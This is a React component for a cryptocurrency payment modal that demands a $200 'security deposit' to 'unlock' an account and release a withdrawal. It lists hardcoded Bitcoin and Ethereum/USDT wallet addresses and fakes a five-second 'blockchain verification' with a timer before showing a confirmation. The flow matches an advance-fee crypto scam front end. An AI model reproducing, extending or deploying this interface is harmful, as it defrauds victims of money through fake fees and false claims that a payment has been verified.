import React, { useState } from "react";

// Payment details data for easy management
const PAYMENT_OPTIONS = {
  bitcoin: {
    name: "Bitcoin (BTC)",
    address: "bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7",
    amount: "$200.00", // CORRECTED AMOUNT
    note: "Please send the exact amount of $200.00 USD worth of Bitcoin to the wallet address below.", // CORRECTED AMOUNT
  },
  ethereum: {
    name: "Ethereum (ETH)",
    address: "0x08cFE6DDC3b58B0655dD1c9214BcfdDBD3855CCA",
    amount: "$200.00", // CORRECTED AMOUNT
    note: "Please send the exact amount of $200.00 USD worth of Ethereum to the wallet address below.", // CORRECTED AMOUNT
  },
  usdt: {
    name: "USDT (ERC-20)",
    address: "0x08cFE6DDC3b58B0655dD1c9214BcfdDBD3855CCA",
    amount: "$200.00", // CORRECTED AMOUNT
    note: "Please send the exact amount of $200.00 USD worth of USDT (ERC-20) to the wallet address below.", // CORRECTED AMOUNT
  },
};

export default function PaymentModal({ onClose }) {
  const [step, setStep] = useState('select_method'); // 'select_method', 'show_details', 'loading', 'confirmed'
  const [selectedMethod, setSelectedMethod] = useState(null);
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [displaySelection, setDisplaySelection] = useState('Choose Crypto Currency');


  const handleMethodSelection = (key) => {
    const method = PAYMENT_OPTIONS[key];
    setSelectedMethod(method);
    setDisplaySelection(method.name);
    setIsDropdownOpen(false); // Close the dropdown
    setStep('show_details'); // Move to details step
  };

  const handleSent = () => {
    setStep('loading'); // Show loading state

    // Simulate the 5-second confirmation process
    setTimeout(() => {
      setStep('confirmed'); // Move to final confirmation screen
    }, 5000); // 5 seconds
  };
  
  const handleClose = () => {
    // Reset state and close the modal
    setStep('select_method');
    setSelectedMethod(null);
    setIsDropdownOpen(false);
    setDisplaySelection('Choose Crypto Currency');
    onClose();
  };

  // --- Step 1: Select Payment Method (Using Custom Dropdown) ---
  if (step === 'select_method') {
    return (
      <div className="modal-overlay">
        <div className="modal">
          <h3>🔐 Account Unlock Required</h3>
          <p>
            To activate your withdrawal and fully unlock your account, a small security deposit is required.
          </p>
          
          <div className="form-card" style={{ padding: '0', marginTop: '20px', position: 'relative' }}>
            <label htmlFor="payment-dropdown" className="note" style={{ display: 'block', textAlign: 'left', marginBottom: '5px' }}>
              Select Payment Method
            </label>
            
            {/* Custom Dropdown Button (mimics the select box) */}
            <button
              onClick={() => setIsDropdownOpen(!isDropdownOpen)}
              style={{
                width: '100%',
                padding: '10px',
                border: '1px solid #ddd',
                borderRadius: '6px',
                textAlign: 'left',
                background: 'white',
                cursor: 'pointer',
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                color: displaySelection === 'Choose Crypto Currency' ? 'gray' : '#222',
                fontWeight: 'normal'
              }}
            >
              {displaySelection}
              {/* Simple arrow indicator */}
              <span style={{ transform: isDropdownOpen ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.2s' }}>▼</span>
            </button>

            {/* Custom Dropdown List */}
            {isDropdownOpen && (
              <ul style={{
                position: 'absolute',
                top: '100%',
                left: '0',
                right: '0',
                backgroundColor: 'white',
                border: '1px solid #ddd',
                borderRadius: '6px',
                zIndex: 10,
                listStyle: 'none',
                padding: '0',
                margin: '5px 0 0 0',
                textAlign: 'left'
              }}>
                {Object.keys(PAYMENT_OPTIONS).map(key => (
                  <li 
                    key={key} 
                    onClick={() => handleMethodSelection(key)}
                    style={{
                      padding: '10px',
                      cursor: 'pointer',
                      borderBottom: '1px solid #eee'
                    }}
                    onMouseOver={(e) => e.currentTarget.style.backgroundColor = '#f4faff'}
                    onMouseOut={(e) => e.currentTarget.style.backgroundColor = 'white'}
                  >
                    {PAYMENT_OPTIONS[key].name}
                  </li>
                ))}
              </ul>
            )}
          </div>

          <div className="btn-group" style={{ marginTop: '25px' }}>
            <button onClick={handleClose} className="btn-secondary">
              Cancel
            </button>
          </div>
        </div>
      </div>
    );
  }
  
  // --- Step 2: Payment Details View (Dynamic) ---
  if (step === 'show_details' && selectedMethod) {
    return (
      <div className="modal-overlay">
        <div className="modal">
          <h3>Send {selectedMethod.name}</h3>
          <p className="note" style={{ marginBottom: '15px' }}>
            {selectedMethod.note}
          </p>
          
          <p style={{ fontWeight: 'bold', fontSize: '1.2rem', color: '#e74c3c' }}>
            Amount Required: {selectedMethod.amount}
          </p>
          
          <p className="note" style={{ marginTop: '15px', textAlign: 'left' }}>
            Wallet Address ({selectedMethod.name}):
          </p>
          <div className="btc-box">
            {selectedMethod.address}
          </div>
          
          <p className="warning">
            WARNING: Ensure you send the exact amount to the specified address.
          </p>
          
          <div className="btn-group">
            <button onClick={() => setStep('select_method')} className="btn-secondary">
              Back
            </button>
            <button onClick={handleSent} className="btn-primary">
              I Have Sent Payment
            </button>
          </div>
        </div>
      </div>
    );
  }

  // --- Step 3: Loading Screen View ---
  if (step === 'loading') {
    return (
      <div className="modal-overlay">
        <div className="modal">
          <div style={{ fontSize: '3rem', color: '#007bff' }}>
            {/* Professional loading spinner placeholder using SVG */}
            <span style={{ 
                display: 'inline-flex', 
                alignItems: 'center', 
                justifyContent: 'center',
                animation: 'spin 1s linear infinite' // Assuming spin keyframe is defined elsewhere or will be ignored
            }}>
                <svg width="40" height="40" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <style>{`
                        .spinner_ajSs{animation:spinner_E4V4 0.75s infinite linear;transform-origin:center}
                        @keyframes spinner_E4V4{100%{transform:rotate(360deg)}}
                    `}</style>
                    <path fill="#007bff" d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8z" opacity=".25"/>
                    <path fill="#007bff" d="M12 20c-4.411 0-8-3.589-8-8h4c0 2.21 1.79 4 4 4s4-1.79 4-4h4c0 5.523-4.477 10-10 10z" className="spinner_ajSs"/>
                </svg>
            </span>
          </div>
          <h3 style={{ marginTop: '20px' }}>Processing Payment...</h3>
          <p className="note">
            Verifying transaction on the blockchain. This may take a moment.
          </p>
        </div>
      </div>
    );
  }

  // --- Step 4: Final Confirmation View ---
  if (step === 'confirmed') {
    return (
      <div className="modal-overlay">
        <div className="modal">
          <h3>✅ Payment Confirmation Received</h3>
          <p>
            Thank you for initiating the transfer.
            **We will confirm your payment shortly** and process your withdrawal.
          </p>
          <div className="btn-group">
            <button onClick={handleClose} className="btn-primary">
              Close Dashboard
            </button>
          </div>
        </div>
      </div>
    );
  }

  return null;
}
